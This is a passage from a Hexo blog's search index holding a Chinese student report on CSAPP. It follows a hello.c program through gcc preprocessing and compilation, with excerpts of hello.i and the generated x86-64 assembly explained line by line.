<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>computer_systems</title>
    <link href="/2024/02/03/csapp/"/>
    <url>/2024/02/03/csapp/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP：一封献给所有CSE学子的情书"><a href="#CSAPP：一封献给所有CSE学子的情书" class="headerlink" title="CSAPP：一封献给所有CSE学子的情书"></a>CSAPP：一封献给所有CSE学子的情书</h1><blockquote><p>本文是对<a href="https://kkee.top/">Kcxain大佬</a>的拙劣模仿</p></blockquote><h2 id="第1章-概述"><a href="#第1章-概述" class="headerlink" title="第1章 概述"></a>第1章 概述</h2><h3 id="1-1-Hello简介"><a href="#1-1-Hello简介" class="headerlink" title="1.1 Hello简介"></a>1.1 Hello简介</h3><p>hello 程序的生命周期是从一个高级 C 语言程序开始的。为了在系统上运行 hello.c 程序，每条 C 语句都必须被其他程序转化为一系列的低级机器语言指令。这样的转化成为编译，最后得以作为进程在计算机系统中运行，也就是 P2P 过程。</p><p>hello 的 P2P 过程是 gcc 调用 cpp(预处理器)&#x2F;cc1(编译器)&#x2F;as(汇编器)&#x2F;ld(连接器)，将 C 语言源文件预处理、编译、汇编、链接，最终生成可执行文件保存在磁盘中。</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031303524.png" alt="编译系统"></p><p>hello 的 020 是 hello 可执行目标程序从运行到最后被回收的过程。在 Shell 中运行该程序时，Shell 调用 fork 函数创建子进程，创建完毕后，操作系统内核提供的 execve 函数会创建虚拟内存的映射，即 mmp，然后开始加载物理内存，进入到 main 函数当中执行相关的代码，打印出信息。在进程中，TLB、4级页表、3级 Cache，Pagefile等等设计会加快程序的运行。程序运行完成后，Shell 回收子进程，操作系统内核删除相关数据结构，释放其占据的资源。至此，hello 的一生就结束了。</p><h3 id="1-2-环境与工具"><a href="#1-2-环境与工具" class="headerlink" title="1.2 环境与工具"></a>1.2 环境与工具</h3><h4 id="1-2-1-操作系统"><a href="#1-2-1-操作系统" class="headerlink" title="1.2.1 操作系统"></a>1.2.1 操作系统</h4><p>Windows 11 21H2、Windows Subsystem for Linux2(Ubuntu 18.04 LTS)</p><h4 id="1-2-2-开发工具"><a href="#1-2-2-开发工具" class="headerlink" title="1.2.2 开发工具"></a>1.2.2 开发工具</h4><p>vscode、gcc、gdb</p><h3 id="1-3中间结果"><a href="#1-3中间结果" class="headerlink" title="1.3中间结果"></a>1.3中间结果</h3><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>hello.c</td><td>源代码</td></tr><tr><td>hello.i</td><td>预处理后的代码</td></tr><tr><td>hello.s</td><td>汇编代码</td></tr><tr><td>hello.o</td><td>可重定位目标文件</td></tr><tr><td>hello.o.elf.txt</td><td>hello.o的ELF</td></tr><tr><td>hello.o.s</td><td>hello.o反汇编后的代码</td></tr><tr><td>hello</td><td>链接后的可执行目标文件</td></tr><tr><td>hello.elf.txt</td><td>hello的ELF</td></tr><tr><td>obj_hello.s</td><td>hello的反汇编代码</td></tr></tbody></table><h3 id="1-4-本章小结"><a href="#1-4-本章小结" class="headerlink" title="1.4 本章小结"></a>1.4 本章小结</h3><p>本章介绍了hello的P2P和020过程，描述了使用的环境与工具，并列出了生成的中间结果文件以及它们的作用</p><h2 id="第2章-预处理"><a href="#第2章-预处理" class="headerlink" title="第2章 预处理"></a>第2章 预处理</h2><h3 id="2-1-预处理的概念与作用"><a href="#2-1-预处理的概念与作用" class="headerlink" title="2.1 预处理的概念与作用"></a>2.1 预处理的概念与作用</h3><h4 id="2-1-1-What"><a href="#2-1-1-What" class="headerlink" title="2.1.1 What"></a>2.1.1 What</h4><p>对源文件进行一些文本方面的操作，比如文本替换、文件包含、删除部分代码等，</p><h4 id="2-1-2-预处理的作用"><a href="#2-1-2-预处理的作用" class="headerlink" title="2.1.2 预处理的作用"></a>2.1.2 预处理的作用</h4><p>预处理根据以字符 # 开头的命令，修改原始的 C 程序。比如我们初学 C 语言时记忆最深刻的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br></code></pre></td></tr></table></figure><p>它就利用了预处理：引用头文件。它告诉预处理器读取系统头文件 stdio.h 的内容，预处理器把它插入程序文本中。</p><h3 id="2-2-linux下的预处理"><a href="#2-2-linux下的预处理" class="headerlink" title="2.2 linux下的预处理"></a>2.2 linux下的预处理</h3><p>linux下使用gcc预处理的命令为：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc –E hello.<span class="hljs-keyword">c</span> –o hello.i<br></code></pre></td></tr></table></figure><p>-E 表示只激活预处理过程</p><h3 id="2-3-Hello的与处理结果解析"><a href="#2-3-Hello的与处理结果解析" class="headerlink" title="2.3 Hello的与处理结果解析"></a>2.3 Hello的与处理结果解析</h3><h4 id="2-3-1-生成文件对比"><a href="#2-3-1-生成文件对比" class="headerlink" title="2.3.1 生成文件对比"></a>2.3.1 生成文件对比</h4><p>hello.c 源码</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031423661.png" alt="hello.c"></p><p>打开生成的 hello.i 文件，发现有 3060 行，并且我们原始的main代码部分被放在最后</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031424794.png" alt="hello.i"></p><h4 id="2-3-2-hello-i文件解析"><a href="#2-3-2-hello-i文件解析" class="headerlink" title="2.3.2 hello.i文件解析"></a>2.3.2 hello.i文件解析</h4><ol><li>外部库文件</li><li>首先。开始部分有一系列外部库.h文件路径</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"># <span class="hljs-number">1</span> <span class="hljs-string">&quot;hello.c&quot;</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;&lt;built-in&gt;&quot;</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span><br># <span class="hljs-number">31</span> <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/stdc-predef.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">32</span> <span class="hljs-string">&quot;&lt;command-line&gt;&quot;</span> <span class="hljs-number">2</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;hello.c&quot;</span><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">27</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">33</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">424</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">427</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">428</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/long-double.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">429</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/sys/cdefs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">425</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">448</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">10</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs-64.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/gnu/stubs.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">449</span> <span class="hljs-string">&quot;/usr/include/features.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">34</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/libc-header-start.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">28</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/7/include/stddef.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">216</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/7/include/stddef.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br># <span class="hljs-number">216</span> <span class="hljs-string">&quot;/usr/lib/gcc/x86_64-linux-gnu/7/include/stddef.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">size_t</span>;<br># <span class="hljs-number">34</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">27</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/wordsize.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">28</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/types.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><ol start="2"><li>数据类型名称替换</li></ol><p>接下来是一堆 typedef，前面是我们编写代码时使用的标准数据类型，而后面的那些别名就是上述讲到的引入的头文件中使用的类型定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> __u_char;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __u_short;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __u_int;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __u_long;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> <span class="hljs-type">__int8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-type">__uint8_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> <span class="hljs-type">__int16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint16_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">int</span> <span class="hljs-type">__int32_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint32_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__int64_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-type">__uint64_t</span>;<br></code></pre></td></tr></table></figure><p>打开一个头文件，其也有类似的行为</p><ol start="3"><li>内部函数声明</li></ol><p>中间部分是很多内部函数的声明，包括系统内核提供的接口的封装：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)))</span> ;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span>;<br># <span class="hljs-number">443</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfscanf</span> <span class="hljs-params">(FILE *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vfscanf&quot;</span>)</span><br><br><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span> ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vscanf&quot;</span>)</span><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)))</span> ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vsscanf&quot;</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br><br><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span>;<br># <span class="hljs-number">477</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fgetc</span> <span class="hljs-params">(FILE *__stream)</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getc</span> <span class="hljs-params">(FILE *__stream)</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>主体代码</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用法： Hello 学号 姓名 秒数！\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s %s \n&quot;</span>,argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>]);<br>        sleep(atoi(argv[<span class="hljs-number">3</span>]));<br>    &#125;<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-本章小结"><a href="#2-4-本章小结" class="headerlink" title="2.4 本章小结"></a>2.4 本章小结</h3><p>本章介绍了 hello.c 的预处理过程，并分析了预处理的结果文件 hello.i。</p><p>从程序员的角度来说，利用宏定义指令可以让我们轻松写出可读性更好的代码，利用条件编译指令可以让我们更加方便快捷的调试代码。</p><p>从hello程序的角度来说，hello.c 是残缺的，不完整的，预处理阶段使它健全了四肢，得以最终运行在操作系统的上下文中。</p><h2 id="第3章-编译"><a href="#第3章-编译" class="headerlink" title="第3章 编译"></a>第3章 编译</h2><h3 id="3-1-编译的概念与作用"><a href="#3-1-编译的概念与作用" class="headerlink" title="3.1 编译的概念与作用"></a>3.1 编译的概念与作用</h3><h4 id="3-1-1-什么是编译"><a href="#3-1-1-什么是编译" class="headerlink" title="3.1.1 什么是编译"></a>3.1.1 什么是编译</h4><p>汇编语言是对硬件的抽象，而 C 语言又是对汇编语言的抽象，C 语言对人友好，但对机器并不友好。编译阶段正是把完整的代码 hello.i 翻译成对应的汇编语言程序 hello.s</p><h3 id="3-2-Ubuntu下编译的命令"><a href="#3-2-Ubuntu下编译的命令" class="headerlink" title="3.2 Ubuntu下编译的命令"></a>3.2 Ubuntu下编译的命令</h3><p>Linux下使用 gcc 编译的命令为：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -S hello<span class="hljs-selector-class">.i</span> -o hello<span class="hljs-selector-class">.s</span> <br></code></pre></td></tr></table></figure><p>-S 表示只激活到编译过程</p><h3 id="3-3-Hello的编译结果解析"><a href="#3-3-Hello的编译结果解析" class="headerlink" title="3.3 Hello的编译结果解析"></a>3.3 Hello的编译结果解析</h3><p>hello.i 编译生成了对应的汇编代码，在这一节中，我将对 C 语言中数据类型及各式操作如何编译到汇编代码中逐个解析</p><h4 id="3-3-1-常量"><a href="#3-3-1-常量" class="headerlink" title="3.3.1 常量"></a>3.3.1 常量</h4><p>1.字符型常量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">4</span>)&#123;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用法： Hello 学号 姓名 秒数！\n&quot;</span>);<br>       <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>printf打印了一个字符串，这个字符串常量存在.LC0中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.LC0:<br>.string&quot;\347\224\250\346\263\225\357\274\232 Hello \345\255\246\345\217\267 \345\247\223\345\220\215 \347\247\222\346\225\260\357\274\201&quot;<br></code></pre></td></tr></table></figure><ol start="2"><li>其他常量</li></ol><p>还有一些其它常量直接在汇编代码中以立即数的身份出现，例如这段代码，有一个整型常量4</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">4</span>)&#123;<br>       printf(<span class="hljs-string">&quot;用法： Hello 学号 姓名 秒数！\n&quot;</span>);<br>       <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>它对应的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmpl$4, -20(%rbp)<br>je.L2<br>leaq.LC0(%rip), %rdi<br>callputs@PLT<br></code></pre></td></tr></table></figure><p>cmpl 比较 argc 与 4 是否相等，如果不相等，才把上述的字符串常量加载到寄存器</p><h4 id="3-3-2-变量与运算"><a href="#3-3-2-变量与运算" class="headerlink" title="3.3.2 变量与运算"></a>3.3.2 变量与运算</h4><ol><li>局部变量</li></ol><p>局部变量存储在寄存器或栈中。</p><p>hello.c中有一个局部变量：</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402031439475.png" alt="局部变量"></p><p>i 是在一个 for 循环语句中作为循环变量，这段代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L3:<br>cmpl$7, -4(%rbp)<br>jle.L4<br>callgetchar@PLT<br>movl$0, %eax<br></code></pre></td></tr></table></figure><p>可以看到，i 存储在栈中。</p><ol start="2"><li>算数操作</li></ol><p>同时在上述的 for 循环中，局部变量 i 的值每次加1，这个运算就由 addl 指令来完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">addl$1, -4(%rbp)<br></code></pre></td></tr></table></figure><h4 id="3-3-3-数组-指针操作"><a href="#3-3-3-数组-指针操作" class="headerlink" title="3.3.3 数组&#x2F;指针操作"></a>3.3.3 数组&#x2F;指针操作</h4><p>main 函数的参数中，有一个字符串数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>&#123;<br></code></pre></td></tr></table></figure><p>其中，argc 是输入的参数的个数，也就是字符串数组 argv 中的元素个数。</p><p>根据下面这行代码：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">sleep(<span class="hljs-name">atoi</span>(<span class="hljs-name">argv</span>[<span class="hljs-number">3</span>]))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>其对应汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq-32(%rbp), %rax<br>addq$24, %rax<br>movq(%rax), %rax<br>movq%rax, %rdi<br>callatoi@PLT<br>movl%eax, %edi<br>callsleep@PLT<br></code></pre></td></tr></table></figure><p>%rdi 是第一个参数寄存器，也就是存储函数 atoi 调用的参数，所以栈中 %rbp-8 指向的栈空间存的内容就是 argv[3] 的地址</p><p>同理，观察以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L4:<br>movq-32(%rbp), %rax<br>addq$16, %rax<br>movq(%rax), %rdx<br>movq-32(%rbp), %rax<br>addq$8, %rax<br>movq(%rax), %rax<br>movq%rax, %rsi<br>leaq.LC1(%rip), %rdi<br>movl$0, %eax<br>callprintf@PLT<br></code></pre></td></tr></table></figure><p>经过分析，分别找到 argv[1] 的地址存放在 %rbp-16 指向的栈空间中，argv[2] 的地址存放在 %rbp-24 存放的栈空间中。</p><h4 id="3-3-4-控制转移"><a href="#3-3-4-控制转移" class="headerlink" title="3.3.4 控制转移"></a>3.3.4 控制转移</h4><p>同样还是以上述那段 for 循环的代码为例，循环变量 i 从 0 开始，每次循环都要加 1，并在循环开始判断 i&lt;8，对应的汇编代码就是用 cmpl 指令，判断 i 是否小于等于 7，如果是，则继续执行循环体中的内容，如果不是则跳出循环。</p><h4 id="3-3-5-函数调用与返回"><a href="#3-3-5-函数调用与返回" class="headerlink" title="3.3.5 函数调用与返回"></a>3.3.5 函数调用与返回</h4><ol><li>main函数</li></ol><p>传入参数为 argc，和 argv，为系统调用，且参数从 Shell 中传入，返回值设置为 0</p><ol start="2"><li>printf函数</li></ol><p>通过设置寄存器 %rdi 和 %rsi 的值来传入参数并调用</p><figure class="highlight plaintext"><table><tr><td 